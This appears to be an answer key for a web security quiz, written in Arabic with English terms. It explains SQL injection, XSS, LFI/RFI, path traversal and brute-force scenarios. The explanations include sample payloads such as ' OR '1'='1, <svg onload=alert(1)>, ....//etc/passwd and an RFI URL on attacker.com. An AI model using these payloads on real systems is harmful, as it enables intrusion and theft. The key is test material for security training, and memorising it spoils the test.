**Web Security Quiz 11 — الإجابات والشرح الكامل**

---

## Q1 — Hardcoded Credentials

**السؤال:** وجدت /backup/dev.zip فيه source code بـ credentials مكتوبة في الكود — ما الخطوة التالية؟

**✅ الإجابة الصحيحة: B — Use credentials to test login**

|الخيار|الحكم|السبب|
|---|---|---|
|A — Ignore it|❌|اكتشاف حقيقي لا يُتجاهل|
|B — Use credentials to test login|✅|الخطوة المنطقية في مرحلة Exploitation|
|C — Run XSS|❌|غير ذات صلة بالموقف|
|D — Perform DoS|❌|هجوم مختلف تماماً|

**الشرح:** credentials مكتوبة في الكود تُسمى Hardcoded Credentials وهي ثغرة خطيرة. الـ pentester يختبرها مباشرة على الـ login لمعرفة إذا كانت تشتغل على بيئة الـ production.

---

## Q2 — SQL Injection Authentication Bypass

**السؤال:** الاستعلام هو `SELECT * FROM users WHERE user='$u' AND pass='$p'` — أي payload يتخطى الـ login؟

**✅ الإجابة الصحيحة: B — ' OR '1'='1**

|الخيار|الحكم|السبب|
|---|---|---|
|A — admin:admin|❌|مجرد تخمين، ليس SQL Injection|
|B — ' OR '1'='1|✅|يجعل الشرط دائماً true|
|C — none|❌|خطأ|
|D — ../etc/passwd|❌|هذا Path Traversal وليس SQLi|

**الشرح:** الـ payload يغلق الـ string بـ `'` ثم يضيف `OR '1'='1` الذي دائماً صحيح، فيصبح الاستعلام يرجع كل المستخدمين ويتخطى التحقق.

---

## Q3 — SQL Injection Filter Bypass

**السؤال:** التطبيق يحجب `' OR 1=1 --` لكن لا يحجب صيغ comment أخرى — أي payload يشتغل؟

**✅ الإجابة الصحيحة: A — ' OR 1=1 #**

|الخيار|الحكم|السبب|
|---|---|---|
|A — ' OR 1=1 #|✅|# هي comment في MySQL تماماً مثل --|
|B — ' OR 1=1 --|❌|محجوب بالفعل حسب السؤال|
|C — ' OR 1=1 /*|⚠️|تفتح comment لكن لا تغلقه، قد لا تشتغل دائماً|
|D — admin|❌|ليس injection|

**الشرح:** هذا Filter Bypass — الـ filter يمنع `--` فقط فتستبدلها بـ `#` لتحقيق نفس النتيجة.

---

## Q4 — أنواع SQL Injection

**السؤال:** رسائل خطأ تكشف SQL syntax — ما نوع الـ SQL Injection؟

**✅ الإجابة الصحيحة: B — Error-based SQLi**

|النوع|المعنى|
|---|---|
|Error-based ✅|يظهر رسائل خطأ مباشرة من قاعدة البيانات|
|Blind|لا تظهر رسائل خطأ، تستنتج النتائج بطرق أخرى|
|Time-based|يعتمد على تأخير الاستجابة (SLEEP)|
|Union-based|يعتمد على دمج نتائج استعلام إضافي|

**الشرح:** ظهور رسائل مثل `You have an error in your SQL syntax` هو مؤشر Error-based SQLi — مفيد لأنه يعطيك معلومات مباشرة عن هيكل الـ database.

---

## Q5 — اكتشاف SQL Injection

**السؤال:** id=1 يرجع بيانات، id=1' يسبب error — ماذا يدل هذا؟

**✅ الإجابة الصحيحة: B — Possible SQL Injection**

|الخيار|الحكم|السبب|
|---|---|---|
|A — No vulnerability|❌|العكس هو الصحيح|
|B — Possible SQL Injection|✅|الـ single quote كسر الاستعلام|
|C — XSS vulnerability|❌|XSS لا يسبب SQL errors|
|D — Path Traversal|❌|لا صلة هنا|

**الشرح:** إضافة `'` وسببت خطأ SQL — مؤشر كلاسيكي على أن الـ input يُدرج مباشرة في الاستعلام بدون sanitization.

---

## Q6 — UNION-based SQL Injection

**السؤال:** أي payload يستخرج بيانات باستخدام UNION؟

**✅ الإجابة الصحيحة: A — ' UNION SELECT null, null --**

|الخيار|الحكم|السبب|
|---|---|---|
|A — ' UNION SELECT null, null --|✅|يختبر عدد الـ columns بدون error|
|B — ../etc/passwd|❌|هذا Path Traversal|
|D — admin123|❌|مجرد نص عادي|

**الشرح:** نبدأ بـ `null, null` لتحديد عدد الـ columns، ثم نستبدلها بـ `database()` أو `user()` لاستخراج معلومات حقيقية.

---

## Q7 — Local File Inclusion (LFI)

**السؤال:** ما التأثير الرئيسي لـ LFI؟

**✅ الإجابة الصحيحة: B — Reading sensitive files**

|الهجوم|التأثير الرئيسي|
|---|---|
|LFI ✅|قراءة ملفات حساسة من السيرفر|
|XSS|Cookie theft|
|SQLi|Database deletion/extraction|
|SSRF|Network scanning|

**الشرح:** LFI تسمح بقراءة ملفات محلية من السيرفر مثل `/etc/passwd`. RFI أخطر — تضمين ملف خارجي وتنفيذه كـ code.

---

## Q8 — XSS Filter Bypass (SVG)

**السؤال:** الـ input يفلتر `<script>` لكن يسمح بـ SVG — أي payload ينفذ JavaScript؟

**✅ الإجابة الصحيحة: A — `<svg onload=alert(1)>`**

|الخيار|الحكم|السبب|
|---|---|---|
|A — `<svg onload=alert(1)>`|✅|SVG يدعم event handlers|
|B — `<b>alert</b>`|❌|HTML نص فقط، لا تنفيذ|
|C — alert(1)|❌|بدون وسم HTML لا ينفذ|
|D — //comment|❌|تعليق JavaScript فقط|

**الشرح:** هذا XSS Filter Bypass — الـ filter يمنع `<script>` لكن `onload` في SVG ينفذ تلقائياً عند التحميل. المبدأ: blacklisting وسوم معينة غير كافٍ.

---

## Q9 — Remote File Inclusion (RFI)

**السؤال:** أي payload يحاول RFI؟

**✅ الإجابة الصحيحة: C — http://attacker.com/shell.txt**

|الخيار|الحكم|النوع|
|---|---|---|
|A — ../../etc/passwd|❌|Path Traversal / LFI|
|B — /var/log/auth.log|❌|LFI — ملف محلي|
|C — http://attacker.com/shell.txt|✅|RFI — URL خارجي|
|D — index.php|❌|ملف محلي عادي|

**الشرح:** RFI يستخدم URL خارجي. المهاجم يضع PHP خبيث على سيرفره، التطبيق يجلبه وينفذه — النتيجة Remote Code Execution (RCE).

---

## Q10 — Path Traversal في File Download

**السؤال:** download.php?file=report.pdf — ما الهجوم الذي تختبره؟

**✅ الإجابة الصحيحة: B — Path Traversal**

|الخيار|الحكم|السبب|
|---|---|---|
|A — SQL Injection|❌|الـ parameter اسم ملف وليس SQL|
|B — Path Traversal|✅|parameter يأخذ اسم ملف = Path Traversal|
|C — XSS|❌|لا output يُعرض في المتصفح|
|D — CSRF|❌|لا صلة بوظيفة التحميل|

**الشرح:** كلما رأيت `file=`, `path=`, `page=`, `document=` فوراً فكّر في Path Traversal. تحاول `../../etc/passwd` بدلاً من `report.pdf`.

---

## Q11 — Non-recursive Strip Bypass

**السؤال:** أي payload يتخطى فلترة `../` البسيطة؟

**✅ الإجابة الصحيحة: A — ....//etc/passwd**

|الخيار|الحكم|السبب|
|---|---|---|
|A — ....//etc/passwd|✅|بعد حذف ../ يتبقى ../|
|B — /etc/passwd|❌|absolute path قد تمنعه فلاتر أخرى|
|C, D|❌|لا علاقة لها بـ traversal|

**الشرح:** الـ filter يحذف `../` مرة واحدة فقط (non-recursive). من `....//` بعد الحذف يتبقى `../` — هذا بالضبط سيناريو PortSwigger Non-recursive strip bypass.

---

## Q12 — 403 Bypass بـ Encoded Traversal

**السؤال:** الوصول المباشر يرجع 403 Forbidden — ما الـ bypass المحتمل؟

**✅ الإجابة الصحيحة: C — Use encoded traversal**

|الخيار|الحكم|السبب|
|---|---|---|
|A — Change browser|❌|لا أثر على الـ server response|
|B — Use POST|❌|403 لا علاقة له بالـ method عادةً|
|C — Use encoded traversal|✅|الـ filter يقارن raw string فقط|
|D — Refresh page|❌|لا معنى تقني|

**الشرح:** الـ WAF يتحقق من المسار المكتوب حرفياً. URL encoding مثل `%2e%2e%2f` أو double encoding `%252e%252e%252f` قد تتخطاه — هذا سيناريو Double URL Encoding من PortSwigger.

---

## Q13 — Brute Force وغياب Rate Limiting

**السؤال:** نظام login بدون rate limiting — ما الهجوم الممكن؟

**✅ الإجابة الصحيحة: C — Brute force**

|الخيار|الحكم|السبب|
|---|---|---|
|A — XSS|❌|لا علاقة له بـ rate limiting|
|B — SQL Injection|❌|يستغل الـ input وليس التكرار|
|C — Brute force|✅|تجربة آلاف كلمات المرور تلقائياً|
|D — Path traversal|❌|لا صلة|

**الشرح:** غياب Rate Limiting يسمح باستخدام أدوات مثل Hydra أو Burp Intruder لتجربة آلاف كلمات المرور. الحماية: rate limiting + CAPTCHA + account lockout.

---

## Q14 — HTTP Response Codes وـ Access Control

**السؤال:** أي HTTP response code يشير إلى مشاكل في access control؟

**✅ الإجابة الصحيحة: C — 403**

|الكود|المعنى|
|---|---|
|200|طلب ناجح|
|301|Redirect|
|403 ✅|Forbidden — موجود لكن ممنوع الوصول|
|500|Internal Server Error|

**الشرح:** 403 يعني المورد موجود لكن محمي بصلاحيات — مؤشر للـ pentester لاختبار bypasses. الفرق:
401 = محتاج login
، 403 = مسجل لكن غير مسموح.

---

## Q15 — Vulnerability Chaining

**السؤال:** ثغرات ضعيفة متعددة (XSS + weak authentication) تؤدي لاختراق كامل — ما اسم هذا؟

**✅ الإجابة الصحيحة: C — Vulnerability chaining**

|الخيار|الحكم|السبب|
|---|---|---|
|A — Enumeration|❌|مرحلة جمع معلومات فقط|
|B — Hashing|❌|عملية تشفير|
|C — Vulnerability chaining|✅|سلسلة ثغرات لتحقيق هدف أكبر|
|D — Encoding|❌|تحويل صيغة البيانات|

**الشرح:** Vulnerability Chaining = استغلال أكثر من ثغرة بالتسلسل. كل ثغرة بمفردها low severity، لكن سلسلتها معاً تؤدي لـ critical impact — مفهوم مهم جداً في كتابة تقارير الـ pentest.